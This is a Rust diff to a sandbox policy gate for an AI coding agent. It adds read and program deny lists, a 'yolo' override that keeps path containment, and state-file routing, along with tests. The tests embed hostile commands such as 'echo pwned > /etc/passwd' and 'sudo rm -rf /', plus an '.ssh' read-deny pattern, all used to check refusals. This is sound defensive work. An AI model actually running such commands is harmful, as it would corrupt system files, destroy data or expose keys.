@@ -262,6 +262,21 @@ pub struct PolicyGate {
     workspace_root_real: PathBuf,
     allow_write: PatternSet,
     deny_write: PatternSet,
+    deny_read: PatternSet,
+    /// The project's own `.agent/`, when the caller knows it.
+    ///
+    /// The plan, the acceptance criteria and the task tree have exactly one home: `<repo>/.agent/`.
+    /// The worktree is a *sibling* directory (`<parent>/<name>-agent/<task>`) and holds a checked-out
+    /// copy of `.agent/` from whenever the branch was cut. That copy is stale by construction —
+    /// measured on the `word-count` fixture: the project said every subtask was `done` while the
+    /// worktree still said all of them were `pending`. `read_state` and `update_state` therefore
+    /// address this directory, and the gate has to know where it is to allow a path it does not
+    /// otherwise reach.
+    ///
+    /// `None` means "no project root known", which is the honest answer for a gate built by a test
+    /// or a caller that only has a worktree. State tools then fall back to the worktree copy, which
+    /// is the pre-fix behaviour rather than a new failure mode.
+    project_agent_dir: Option<PathBuf>,
     policy: Policy,
 }
 
@@ -269,9 +284,10 @@ impl PolicyGate {
     /// Build a gate for one task worktree.
     ///
     /// # Errors
-    /// An `allow_write_globs` or `deny_write_globs` pattern this project's matcher does not
-    /// implement. A denied-list typo must be a startup failure: a deny rule that silently matches
-    /// nothing is worse than no deny list, because the config claims protection it does not give.
+    /// An `allow_write_globs`, `deny_write_globs` or `deny_read_globs` pattern this project's
+    /// matcher does not implement. A denied-list typo must be a startup failure: a deny rule that
+    /// silently matches nothing is worse than no deny list, because the config claims protection it
+    /// does not give.
     pub fn new(
         worktree: impl Into<PathBuf>,
         allow_write_globs: &[String],
@@ -289,25 +305,48 @@ impl PolicyGate {
             workspace_root,
             allow_write: PatternSet::parse(allow_write_globs)?,
             deny_write: PatternSet::parse(deny_write_globs)?,
+            // Read from the policy rather than a parameter: unlike the write lists, this one has a
+            // single source and no caller that needs to override it.
+            deny_read: PatternSet::parse(&policy.deny_read_globs)?,
+            project_agent_dir: None,
             policy,
         })
     }
 
+    /// The same gate, told where the project's `.agent/` is.
+    ///
+    /// Set once, by the daemon, from the registered project path. It is not a constructor
+    /// parameter because almost every caller has no project root — every tool test builds a gate
+    /// from a bare worktree — and a required argument would make those tests invent one.
+    #[must_use]
+    pub fn with_project_agent_dir(mut self, agent_dir: impl Into<PathBuf>) -> Self {
+        self.project_agent_dir = Some(normalise(&absolute(&expand_tilde(&agent_dir.into()))));
+        self
+    }
+
+    /// The project's `.agent/`, when the caller supplied one.
+    #[must_use]
+    pub fn project_agent_dir(&self) -> Option<&Path> {
+        self.project_agent_dir.as_deref()
+    }
+
     /// A gate with the design's defaults, for tests and for a first run.
     ///
+    /// The write lists come from `policy`, not from the constants that used to live here. The
+    /// hardcoded pair meant an operator's `deny_write_globs` was parsed, validated, and then
+    /// thrown away by the constructor the daemon actually calls — a deny list that reported no
+    /// error and enforced nothing.
+    ///
     /// # Errors
-    /// The default patterns are compiled at startup like any other; this is an error only if the
-    /// defaults themselves are broken, which a test pins.
+    /// The policy's patterns are ones this project's matcher does not implement, which is an error
+    /// only if the defaults themselves are broken: a test pins that they are not.
     pub fn with_defaults(
         worktree: impl Into<PathBuf>,
         policy: Policy,
     ) -> Result<Self, crate::glob::GlobError> {
-        Self::new(
-            worktree,
-            &["**".to_string()],
-            &["**/.git/config".to_string(), "**/.env*".to_string()],
-            policy,
-        )
+        let allow = policy.allow_write_globs.clone();
+        let deny = policy.deny_write_globs.clone();
+        Self::new(worktree, &allow, &deny, policy)
     }
 
     /// The worktree writes are confined to.
@@ -331,13 +370,23 @@ impl PolicyGate {
     /// Check a call by its declared effect and the paths it touches.
     ///
     /// The tool reports `Effect::External` for anything it cannot classify — a shell command it
-    /// did not recognise, a network call — and this function never lets that through.
+    /// did not recognise, a network call — and this function never lets that through unless the
+    /// operator turned on `yolo`.
     #[must_use]
     pub fn check(&self, effect: Effect, paths: &[PathUse]) -> Verdict {
         match effect {
             Effect::Read => self.check_reads(paths),
             Effect::Mutate => self.check_writes(paths),
-            Effect::External => Self::escalate("the call was declared external", "external", false),
+            Effect::External => {
+                if self.policy.yolo {
+                    // The same split the trusted-host branch makes: the *external* part is what
+                    // `yolo` waives, and the paths still are not. Turning an escalation into a
+                    // blanket `Allowed` here would let `curl x > /etc/passwd` through, which is a
+                    // hole the flag never claimed to open.
+                    return self.check_writes(paths);
+                }
+                Self::escalate("the call was declared external", "external", false)
+            }
         }
     }
 
@@ -349,6 +398,19 @@ impl PolicyGate {
     #[must_use]
     pub fn check_command(&self, command: &str) -> Verdict {
         let classification = classify::classify(command);
+        // The operator's deny list comes first and has no exceptions. It is checked before the
+        // trusted-host shortcut and before the effect match, because `trusted_hosts` is about the
+        // network and this is about the program: `curl` to a trusted host is still `curl`.
+        if let Some(banned) = self.denied_program(&classification.programs) {
+            return Verdict::Denied(
+                Denial::new(
+                    format!("`{banned}` is on the operator's program deny list"),
+                    &banned,
+                )
+                .with("the program is banned in the global config, where the agent cannot reach it")
+                .with("use a tool or a program that does the job without it"),
+            );
+        }
         if classification.effect == Effect::External {
             // A trusted host is the design's one exception: the model backend lives on one, and
             // asking a human to approve every request to it would make `doctor` unusable. Every
@@ -366,6 +428,11 @@ impl PolicyGate {
                 .programs
                 .iter()
                 .any(|program| matches!(program.as_str(), "curl" | "wget" | "ssh" | "scp" | "git"));
+            if self.policy.yolo {
+                // Same rule as `check`: the external part is waived, the paths are not. A command
+                // that writes outside the worktree is still refused with the flag on.
+                return self.check(Effect::Mutate, &classification.paths);
+            }
             return Self::escalate(
                 &classification.reason,
                 &format!("command:{}", first_word(command)),
@@ -389,6 +456,18 @@ impl PolicyGate {
         None
     }
 
+    /// The first program in `programs` that the operator banned.
+    ///
+    /// A linear scan over a list a human wrote, so `Vec` is the right container: a `BTreeSet` would
+    /// make the config harder to write for a lookup nobody measures.
+    #[must_use]
+    pub fn denied_program(&self, programs: &[String]) -> Option<String> {
+        programs
+            .iter()
+            .find(|program| self.policy.deny_programs.iter().any(|banned| banned == *program))
+            .cloned()
+    }
+
     fn check_reads(&self, paths: &[PathUse]) -> Verdict {
         for used in paths {
             let Some(resolved) = self.resolve(&used.path) else {
@@ -401,12 +480,42 @@ impl PolicyGate {
                         .with("if the file is genuinely needed, ask with the `escalate` tool"),
                 );
             }
+            if let Some(why) = self.is_denied_read(&resolved) {
+                return Verdict::Denied(
+                    Denial::new(format!("the path is on the read deny list ({why})"), &used.path)
+                        .with("the file is excluded by the operator, not by the worktree")
+                        .with("ask a human if the content is genuinely required"),
+                );
+            }
             // A read that lands in a write position is still a write; callers declare it.
             if used.write {
                 return self.check_writes(std::slice::from_ref(used));
             }
         }
         Verdict::Allowed
+    }
+
+    /// Whether a path is one the operator forbade reading.
+    ///
+    /// Matched relative to [`Self::workspace_root`] rather than the worktree: reads are confined to
+    /// the root, so that is the frame in which a deny glob means something. The worktree is
+    /// excluded deliberately — a pattern written for "everything under my projects directory" would
+    /// otherwise match nothing, because an agent's reads are always worktree-relative while its
+    /// dangerous reads (`~/.ssh`, `~/.aws`) never are.
+    fn is_denied_read(&self, resolved: &Path) -> Option<String> {
+        let relative = resolved.strip_prefix(&self.workspace_root_real).ok()?;
+        let mut out = String::new();
+        for component in relative.components() {
+            if let Component::Normal(part) = component {
+                if !out.is_empty() {
+                    out.push('/');
+                }
+                out.push_str(&part.to_string_lossy());
+            }
+        }
+        self.deny_read
+            .matching(&out)
+            .map(|glob| format!("matched `{glob}`"))
     }
 
     fn check_writes(&self, paths: &[PathUse]) -> Verdict {
@@ -428,29 +537,141 @@ impl PolicyGate {
                 );
             };
 
-            if let Some(why) = self.is_denied_write(&relative) {
-                let mut denial = Denial::new(
-                    format!("the path is protected by the deny list ({why})"),
-                    &used.path,
+            // The five state documents are `update_state`'s to write, and that tool asks
+            // `check_state_write` — which deliberately does not come through here. A plain
+            // `write_file` naming `.agent/NOTES.md` would otherwise write the *worktree's* stale
+            // copy while `update_state` writes the project's, so the same document would have two
+            // versions and the model would be reading one while the runner executed the other
+            // (D-103). Measured on two consecutive `black_jack` runs: an `edit_file` on `NOTES.md`
+            // was refused as missing, the model created `NOTES.md` in the repository root instead,
+            // and that file went into its commit.
+            //
+            // Only the `.agent/` names are refused. A repository may legitimately have its own
+            // root `NOTES.md`, and blocking that would be the gate guessing about a file it does
+            // not own.
+            //
+            // `used.write` is part of the test. `check_writes` is also the path a *mutating*
+            // command's read paths take — `Cargo.toml` is judged as a mutate because the command
+            // may write somewhere — so a guard that ignored the flag refused
+            // `cat .agent/TASKS.json 2>/dev/null`, a plain read, three times in the third live
+            // run. The sink redirect is what makes the command `Mutate`, and the observation told
+            // the model to "write the document with `update_state`", which is not what it was
+            // doing.
+            if used.write
+                && let Some(name) = relative.strip_prefix(crate::state::AGENT_DIR)
+                && let Some(name) = name.strip_prefix('/')
+                && crate::state::StateFile::is_state_file(name)
+            {
+                return Verdict::Denied(
+                    Denial::new(
+                        "the five state documents belong to `update_state`, not to a file write",
+                        &used.path,
+                    )
+                    .with(format!(
+                        "write the document with `update_state` and `file: \"{name}\"`"
+                    ))
+                    .with("read it back with `read_state`, so both see the project's copy"),
                 );
-                denial = denial
-                    .with("choose another file")
-                    .with("if this is genuinely required, it is a human decision, not a tool call");
-                if Self::needs_escalation_for_write(&relative) {
-                    denial = denial.asking(format!("write:{relative}"));
-                }
-                return Verdict::Denied(denial);
             }
 
-            if !self.allow_write.matches(&relative) {
-                return Verdict::Denied(
-                    Denial::new("the path is not covered by the write allow list", &used.path)
-                        .with(format!("write inside `{}` only", self.worktree.display()))
-                        .with("the allow list is read from the global config, not the project"),
-                );
+            if let Some(verdict) = self.check_one_write(&relative, used) {
+                return verdict;
             }
         }
         Verdict::Allowed
+    }
+
+    /// Check a write to one of the five state documents in the *project's* `.agent/`.
+    ///
+    /// Deliberately not part of [`Self::check_writes`]. That function is the gate for every tool,
+    /// and teaching it that a path outside the worktree may be written would let `write_file`
+    /// rewrite the plan directly — a capability `update_state` exists to make impossible in the
+    /// first place. Only the state tools ask this question, and only with a name from the closed
+    /// list, so the set of writable paths outside the worktree is five files and nothing else.
+    #[must_use]
+    pub fn check_state_write(&self, name: &str) -> Verdict {
+        if !crate::state::StateFile::is_state_file(name) {
+            return Verdict::Denied(
+                Denial::new("the file is not one of the five state documents", name)
+                    .with("use `update_state`, whose `file` argument is an enum, not a path"),
+            );
+        }
+        let used = PathUse::write(self.state_path(name).display().to_string());
+        // The deny list is evaluated against `.agent/<name>`, the same string it would see for a
+        // copy inside the worktree, so an operator's pattern keeps its meaning.
+        let relative = format!(".agent/{name}");
+        self.check_one_write(&relative, &used).unwrap_or(Verdict::Allowed)
+    }
+
+    /// Check a read of one of the five state documents in the project's `.agent/`.
+    ///
+    /// Reads inside `workspace_root` are already allowed, so this is not a permission — it is the
+    /// same five-name list as the write side, so that a model naming `JOURNAL.jsonl` gets the
+    /// argument error `update_state` would give rather than a journal read dressed as state.
+    #[must_use]
+    pub fn check_state_read(&self, name: &str) -> Verdict {
+        if !crate::state::StateFile::is_state_file(name) {
+            return Verdict::Denied(
+                Denial::new("the file is not one of the five state documents", name)
+                    .with("use `read_state`, whose `file` argument is an enum, not a path"),
+            );
+        }
+        let resolved = self.state_path(name);
+        if let Some(why) = self.is_denied_read(&resolved) {
+            return Verdict::Denied(
+                Denial::new(format!("the path is on the read deny list ({why})"), name)
+                    .with("the file is excluded by the operator, not by the worktree"),
+            );
+        }
+        Verdict::Allowed
+    }
+
+    /// The absolute path of a state document, in the project's `.agent/` when it is known.
+    ///
+    /// The fallback is the worktree's copy, which is what every test and every gate built from a
+    /// bare worktree gets. It is stale by construction during a real run — the worktree branch was
+    /// cut before the plan was edited — which is exactly why the daemon always supplies the project
+    /// root through [`Self::with_project_agent_dir`].
+    #[must_use]
+    pub fn state_path(&self, name: &str) -> PathBuf {
+        self.project_agent_dir.as_ref().map_or_else(
+            || self.worktree.join(crate::state::AGENT_DIR).join(name),
+            |dir| dir.join(name),
+        )
+    }
+
+    /// The directory holding the state documents, for a caller that needs the whole set.
+    #[must_use]
+    pub fn state_dir(&self) -> PathBuf {
+        self.project_agent_dir
+            .clone()
+            .unwrap_or_else(|| self.worktree.join(crate::state::AGENT_DIR))
+    }
+
+    /// Judge one write against the deny list and the allow list.
+    fn check_one_write(&self, relative: &str, used: &PathUse) -> Option<Verdict> {
+        if let Some(why) = self.is_denied_write(relative) {
+            let mut denial = Denial::new(
+                format!("the path is protected by the deny list ({why})"),
+                &used.path,
+            );
+            denial = denial
+                .with("choose another file")
+                .with("if this is genuinely required, it is a human decision, not a tool call");
+            if Self::needs_escalation_for_write(relative) {
+                denial = denial.asking(format!("write:{relative}"));
+            }
+            return Some(Verdict::Denied(denial));
+        }
+
+        if !self.allow_write.matches(relative) {
+            return Some(Verdict::Denied(
+                Denial::new("the path is not covered by the write allow list", &used.path)
+                    .with(format!("write inside `{}` only", self.worktree.display()))
+                    .with("the allow list is read from the global config, not the project"),
+            ));
+        }
+        None
     }
 
     /// Neither `.git` nor the project config can be granted by a config flag.
@@ -785,15 +1006,14 @@ mod tests {
     }
 
     #[test]
-    fn the_agents_own_state_files_stay_writable() {
-        // The deny list above must not take `update_state` with it: those files are the agent's
-        // working memory, not the audit trail.
+    fn the_agents_own_state_files_stay_writable_through_update_state() {
+        // The deny list above must not take the state tools with it: those files are the agent's
+        // working memory, not the audit trail. Since D-103 they are written by `update_state` into
+        // the *project's* `.agent/`, so it is `check_state_write` that has to stay allowed — a
+        // generic write is refused because it would write the worktree's stale copy instead.
         for path in [".agent/TASKS.json", ".agent/DECISIONS.md", ".agent/NOTES.md"] {
-            assert_eq!(
-                gate().check(Effect::Mutate, &[PathUse::write(path)]),
-                Verdict::Allowed,
-                "{path}"
-            );
+            let name = path.trim_start_matches(".agent/");
+            assert_eq!(gate().check_state_write(name), Verdict::Allowed, "{name}");
         }
     }
 
@@ -908,6 +1128,64 @@ mod tests {
     }
 
     #[test]
+    fn a_gate_check_can_check_for_a_tilde_pattern() {
+        // The check the first live run never ran. `~` as a *path* is refused by design, but a grep
+        // pattern is not a path, and `grep -qE '~> *3\.4' README.md` is exactly how a definition of
+        // done asks "does the README name this requirement". Reading the pattern as a path denied
+        // the check before it executed and blocked the subtask on a README that was already
+        // correct.
+        for command in [
+            "grep -qE '~> *3\\.4' README.md",
+            "grep -q '~> 3.4' README.md",
+            "grep -c '~' README.md",
+        ] {
+            assert_eq!(gate().check_command(command), Verdict::Allowed, "{command}");
+        }
+        // The file operand is still judged: a pattern does not launder the path beside it.
+        let verdict = gate().check_command("grep -q 'x' /etc/passwd");
+        let Verdict::Denied(denial) = verdict else {
+            panic!("the file operand must still be checked, got {verdict:?}");
+        };
+        assert!(denial.reason.contains("outside"), "{denial:?}");
+    }
+
+    #[test]
+    fn a_redirect_to_dev_null_is_not_a_write_outside_the_worktree() {
+        // The bug the first live run hit hardest: `/dev/null` was read as a write outside the
+        // worktree, so `bundle exec rspec 2>/dev/null` — and every other ordinary way to silence
+        // stderr — was denied. Two subtasks were blocked on DoD gates whose command never ran:
+        // the gate reported "(no exit code)", which reads as a failing check rather than as a
+        // policy refusal, so the model kept rewriting code that was already correct.
+        for command in [
+            "cargo test 2>/dev/null",
+            "cargo test > /dev/null 2>&1",
+            "grep -qE 'x' README.md > /dev/null",
+        ] {
+            assert_eq!(gate().check_command(command), Verdict::Allowed, "{command}");
+        }
+        // An unknown program is still external: the sink excuses a path, never a program. The
+        // distinction matters because the live command was `bundle exec rspec`, and calling that
+        // `Allowed` would be a different — and much larger — change than the one being made.
+        let verdict = gate().check_command("bundle exec rspec 2>/dev/null");
+        let Verdict::Escalated(escalation) = verdict else {
+            panic!("an unknown program must still be escalated, got {verdict:?}");
+        };
+        assert!(
+            escalation.reason.contains("`bundle` is not a known command"),
+            "{escalation:?}"
+        );
+    }
+
+    #[test]
+    fn a_sink_redirect_does_not_excuse_a_real_write_on_the_same_line() {
+        // Not a whitelist for the line: the sink is skipped and every other path is still judged.
+        // A rule that returned `Allowed` as soon as it saw `/dev/null` would be the hole this
+        // whole module exists to close.
+        let verdict = gate().check_command("echo x > /dev/null; echo pwned > /etc/passwd");
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
     fn a_trusted_host_command_is_allowed() {
         // The model backend lives on a trusted host; asking a human for every request would make
         // the system unusable.
@@ -1018,5 +1296,296 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let gate = PolicyGate::with_defaults(dir.path(), policy()).unwrap();
         assert_eq!(gate.worktree(), dir.path());
+    }
+
+    // ── deny_read_globs ─────────────────────────────────────────────────────────
+
+    /// A gate whose `workspace_root` is the tempdir itself, so a relative deny glob has the same
+    /// frame the operator sees when writing one.
+    fn gate_with_deny_read(root: &Path, globs: &[&str]) -> PolicyGate {
+        let mut policy = policy();
+        policy.workspace_root = root.to_path_buf();
+        policy.deny_read_globs = globs.iter().map(|g| (*g).to_string()).collect();
+        PolicyGate::with_defaults(root, policy).expect("valid policy")
+    }
+
+    #[test]
+    fn a_read_on_the_deny_list_is_denied() {
+        // `~/.ssh/id_rsa` used to be as reachable as `src/main.rs` once the workspace root
+        // contained the home directory. The glob is matched relative to that root.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".ssh")).unwrap();
+        std::fs::write(dir.path().join(".ssh/id_rsa"), "secret").unwrap();
+        let gate = gate_with_deny_read(dir.path(), &["**/.ssh/**"]);
+
+        let verdict = gate.check(Effect::Read, &[PathUse::read(".ssh/id_rsa")]);
+        assert!(verdict.is_denied(), "{verdict:?}");
+        assert!(verdict.observation().unwrap().contains("read deny list"));
+    }
+
+    #[test]
+    fn a_read_beside_the_denied_one_is_still_allowed() {
+        // A deny rule that denied the whole directory would be an outage, not a policy.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".ssh")).unwrap();
+        std::fs::write(dir.path().join(".ssh/id_rsa"), "secret").unwrap();
+        std::fs::write(dir.path().join("main.rs"), "fn main() {}").unwrap();
+        let gate = gate_with_deny_read(dir.path(), &["**/.ssh/**"]);
+
+        assert_eq!(
+            gate.check(Effect::Read, &[PathUse::read("main.rs")]),
+            Verdict::Allowed
+        );
+    }
+
+    #[test]
+    fn an_empty_read_deny_list_denies_nothing() {
+        // The default. If this ever fails, every existing project starts refusing reads.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("a.txt"), "x").unwrap();
+        let gate = gate_with_deny_read(dir.path(), &[]);
+        assert_eq!(
+            gate.check(Effect::Read, &[PathUse::read("a.txt")]),
+            Verdict::Allowed
+        );
+    }
+
+    #[test]
+    fn a_malformed_read_deny_glob_fails_at_construction() {
+        // Same rule as the write list: a deny rule that silently matches nothing is worse than
+        // none, because the config claims protection it does not give.
+        let mut policy = policy();
+        policy.deny_read_globs = vec!["**/{a,b}".to_string()];
+        let error = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap_err();
+        assert!(error.to_string().contains("brace"), "{error}");
+    }
+
+    // ── deny_programs ───────────────────────────────────────────────────────────
+
+    fn gate_with_deny_programs(programs: &[&str]) -> PolicyGate {
+        let mut policy = policy();
+        policy.deny_programs = programs.iter().map(|p| (*p).to_string()).collect();
+        PolicyGate::with_defaults("/tmp/ws/repo", policy).expect("valid policy")
+    }
+
+    #[test]
+    fn a_denied_program_is_denied_not_escalated() {
+        // Escalated would mean "a human may say yes", and a deny list is exactly the answer a
+        // human already gave.
+        let gate = gate_with_deny_programs(&["sudo"]);
+        let verdict = gate.check_command("sudo ls");
+        assert!(verdict.is_denied(), "{verdict:?}");
+        assert!(verdict.observation().unwrap().contains("program deny list"));
+    }
+
+    #[test]
+    fn a_denied_program_is_caught_after_its_path() {
+        // `/usr/bin/sudo` must not slip past a list naming `sudo`: the classifier reports the
+        // basename, which is what a human writes.
+        let gate = gate_with_deny_programs(&["sudo"]);
+        assert!(gate.check_command("/usr/bin/sudo ls").is_denied());
+    }
+
+    #[test]
+    fn a_denied_program_wins_over_the_trusted_host_shortcut() {
+        // `trusted_hosts` is about the network; the deny list is about the program. `curl` to the
+        // model backend is still `curl`.
+        let gate = gate_with_deny_programs(&["curl"]);
+        let verdict = gate.check_command("curl http://llm-server:47832/v1/models");
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn a_denied_program_in_a_chain_denies_the_whole_line() {
+        // `bundle exec rspec && sudo rm -rf /` is one command line and one verdict.
+        let gate = gate_with_deny_programs(&["sudo"]);
+        assert!(gate.check_command("ls && sudo ls").is_denied());
+    }
+
+    #[test]
+    fn an_unlisted_program_is_not_denied_by_this_rule() {
+        // The deny list is a deny list: it says nothing about everything else. `frobnicate` is
+        // still an escalation, which is a different verdict.
+        let gate = gate_with_deny_programs(&["sudo"]);
+        let verdict = gate.check_command("frobnicate --all");
+        assert!(!verdict.is_denied(), "{verdict:?}");
+        assert!(matches!(verdict, Verdict::Escalated(_)), "{verdict:?}");
+    }
+
+    // ── with_defaults honours the policy ───────────────────────────────────────
+
+    #[test]
+    fn with_defaults_uses_the_policys_deny_write_globs() {
+        // Regression: this constructor ignored `policy.deny_write_globs` and substituted a
+        // hardcoded pair, so an operator's list was parsed, validated and then discarded. The
+        // daemon calls this constructor, so the bug made the shipped deny list a decoration.
+        let mut policy = policy();
+        policy.deny_write_globs = vec!["secrets/**".to_string()];
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
+        let verdict = gate.check(Effect::Mutate, &[PathUse::write("secrets/key.txt")]);
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn with_defaults_still_denies_the_builtin_protected_paths() {
+        // The defaults are what most operators run; `.git/config` must not become writable just
+        // because the list now comes from the policy.
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy()).unwrap();
+        assert!(
+            gate.check(Effect::Mutate, &[PathUse::write(".git/config")])
+                .is_denied()
+        );
+        assert!(gate.check(Effect::Mutate, &[PathUse::write(".env")]).is_denied());
+    }
+
+    // ── the five state documents ────────────────────────────────────────────────
+
+    #[test]
+    fn a_plain_file_write_may_not_edit_a_state_document() {
+        // `update_state` writes the *project's* `.agent/`; `write_file` resolves inside the
+        // worktree. Letting both through gives one document two versions — the split brain D-103
+        // removed — so the gate sends the model to the tool that owns the name.
+        let gate = gate();
+        for name in [
+            ".agent/NOTES.md",
+            ".agent/PLAN.md",
+            ".agent/DECISIONS.md",
+            ".agent/ACCEPTANCE.md",
+            ".agent/TASKS.json",
+        ] {
+            let verdict = gate.check(Effect::Mutate, &[PathUse::write(name)]);
+            assert!(verdict.is_denied(), "{name}: {verdict:?}");
+            let observation = verdict.observation().expect("an observation");
+            assert!(
+                observation.contains("update_state"),
+                "{name} must name the tool: {observation}"
+            );
+        }
+    }
+
+    #[test]
+    fn reading_a_state_document_through_a_mutating_command_is_not_a_write() {
+        // The measured regression from the third live run: `cat .agent/TASKS.json 2>/dev/null` was
+        // refused three times with "write the document with `update_state`". The sink redirect
+        // makes the command `Mutate`, so its paths reach `check_writes` — but the path itself is a
+        // read, and `used.write` is what says so. Without this the D-107 guard answered a question
+        // nobody asked, and the model lost three steps to it.
+        let gate = gate();
+        assert_eq!(
+            gate.check_command("cat .agent/TASKS.json 2>/dev/null"),
+            Verdict::Allowed
+        );
+        assert_eq!(
+            gate.check_command("grep -n subtasks .agent/TASKS.json"),
+            Verdict::Allowed
+        );
+        assert!(
+            gate.check_command("cat .agent/TASKS.json > copy.json")
+                .is_allowed(),
+            "the read of the document is fine; the redirect writes somewhere else"
+        );
+        assert!(
+            gate.check_command("cat .agent/TASKS.json > .agent/TASKS.json")
+                .is_denied(),
+            "the redirect target is a write and stays refused"
+        );
+    }
+
+    #[test]
+    fn a_repositorys_own_notes_file_is_still_writable() {
+        // The state documents are a closed set of five names *under `.agent/`*. A project that
+        // keeps its own `NOTES.md` — and plenty do — must not be told to use `update_state`.
+        let gate = gate();
+        assert_eq!(
+            gate.check(Effect::Mutate, &[PathUse::write("NOTES.md")]),
+            Verdict::Allowed
+        );
+        assert_eq!(
+            gate.check(Effect::Mutate, &[PathUse::write("docs/NOTES.md")]),
+            Verdict::Allowed
+        );
+        assert_eq!(
+            gate.check(Effect::Mutate, &[PathUse::write(".agent/scratch.md")]),
+            Verdict::Allowed
+        );
+    }
+
+    #[test]
+    fn update_state_can_still_write_the_documents_it_owns() {
+        // The refusal lives in `check_writes`, not in `check_one_write`, precisely so this does
+        // not become a rule that locks the state tools out of their own files.
+        let gate = gate();
+        assert_eq!(gate.check_state_write("NOTES.md"), Verdict::Allowed);
+        assert_eq!(gate.check_state_write("PLAN.md"), Verdict::Allowed);
+    }
+
+    // ── yolo ────────────────────────────────────────────────────────────────────
+
+    fn yolo_gate() -> PolicyGate {
+        let mut policy = policy();
+        policy.yolo = true;
+        PolicyGate::with_defaults("/tmp/ws/repo", policy).expect("valid policy")
+    }
+
+    #[test]
+    fn yolo_lets_an_external_call_through() {
+        assert_eq!(yolo_gate().check(Effect::External, &[]), Verdict::Allowed);
+    }
+
+    #[test]
+    fn yolo_lets_an_unknown_program_run() {
+        // The point of the flag: `bundle exec rspec` stops being a question.
+        assert_eq!(yolo_gate().check_command("bundle exec rspec"), Verdict::Allowed);
+        assert_eq!(yolo_gate().check_command("sudo ls"), Verdict::Allowed);
+    }
+
+    #[test]
+    fn yolo_does_not_let_a_write_outside_the_worktree_through() {
+        // Waiving the escalation must not waive containment: `curl evil > ~/.zshrc` is still a
+        // write outside the worktree.
+        let verdict = yolo_gate().check_command("echo pwned > /etc/passwd");
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn yolo_on_an_external_effect_still_checks_the_paths() {
+        // The same rule at the `check` entry point, which the tools call directly: an external
+        // call that names a path outside the worktree stays denied. Without this, a tool whose
+        // `effect()` returns `External` and whose `paths()` names a protected file would slip past
+        // the flag's stated limit.
+        let verdict = yolo_gate().check(Effect::External, &[PathUse::write("/etc/passwd")]);
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn yolo_does_not_lift_the_program_deny_list() {
+        // The deny list is the operator's statement about what must never happen. A convenience
+        // flag is not a reason to break it.
+        let mut policy = policy();
+        policy.yolo = true;
+        policy.deny_programs = vec!["sudo".to_string()];
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
+        assert!(gate.check_command("sudo ls").is_denied());
+    }
+
+    #[test]
+    fn yolo_does_not_lift_the_write_deny_list() {
+        let mut policy = policy();
+        policy.yolo = true;
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
+        assert!(
+            gate.check(Effect::Mutate, &[PathUse::write(".git/config")])
+                .is_denied(),
+            "yolo must not unlock a path the deny list protects"
+        );
+    }
+
+    #[test]
+    fn yolo_is_off_by_default() {
+        assert!(!Policy::default().yolo);
+        assert!(matches!(
+            gate().check_command("frobnicate --all"),
+            Verdict::Escalated(_)
+        ));
     }
 }
